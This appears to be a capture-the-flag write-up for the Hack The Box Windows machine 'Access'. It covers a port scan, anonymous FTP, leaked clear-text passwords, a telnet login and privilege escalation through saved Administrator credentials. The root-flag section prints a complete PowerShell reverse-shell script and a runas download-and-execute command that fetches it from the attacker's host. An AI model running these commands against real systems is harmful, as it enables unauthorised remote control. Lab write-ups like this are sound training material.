---
title: "HTB - Access"
date: 2026-05-11
draft: false
tags: ["HTB", "Windows", "Write-Up"]
cover:
    image: "/images/writeup_screens/htb_access/htb_access_cover.png"      
    alt: "HTB Access Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| a | a |
| Difficulty | Easy |
| Type | Windows |

**Port Scan**
```
└─$ nmap -sV -sC 10.129.34.220
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-11 15:39 +0200
Nmap scan report for 10.129.34.220
Host is up (0.040s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
```

## User Flag

The port scan shows that anonymous login to the FTP server on standard port **21** is allowed. This means we can login by providing the name _anonymous_ and any password. 

![](/images/writeup_screens/htb_access/htb_access1.png)

I found the following two files stored on the server:
* _Access Control.zip_
* _backup.mdb_

The _backup.mdb_ file is an old Microsoft Access database which can be opened in **DBeaver** after using the default credentials `admin:admin` when prompted. In the table _auth_user_ we can find clear-text credentials of three different user accounts.

![](/images/writeup_screens/htb_access/htb_access2.png)

```
admin:admin
engineer:access4u@security
backup_admin:admin
```

Now i used the newly obtained password of _engineer_ to unzip the _Access Control.zip_ file. We can find a _Access Control.pst_ file in the extracted data which is a **Outlook Personal Storage** file and can be imported with the **Evolution** Mail Client in Kali Linux. After doing so, we can find an E-Mail which leaks another password: 

![](/images/writeup_screens/htb_access/htb_access3.png)

```
security:4Cc3ssC0ntr0ller
```

With these credentials we can finally login to the machine via **telnet**:

```
$ telnet $IP
```

![](/images/writeup_screens/htb_access/htb_access4.png)

The user flag can be found under _C:\Users\security\Desktop\user.txt_

## Root Flag

While enumerating the machine as **security** user, I discovered stored credentials for the **Administrator** user with the following command: 

```
> cmdkey /list
```

We can abuse these stored credentials to execute a command as **Administrator** using the _runas_ utility with the _/savecred_ parameter. First, we need to host a powershell reverse shell script on our Kali Linux machine. I served the following file via a Python HTTP server: 

```
$ cat powershell1.ps1

$LHOST = "10.10.16.239"; $LPORT = 21; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Next, i started a Netcat listener and ran the following command as **security** user on the Windows machine: 

```
> runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.16.239/powershell1.ps1')" 
```

I received a reverse shell as **Administrator** in my listener and was able to read _C:\Users\Administrator\Desktop\root.txt_. 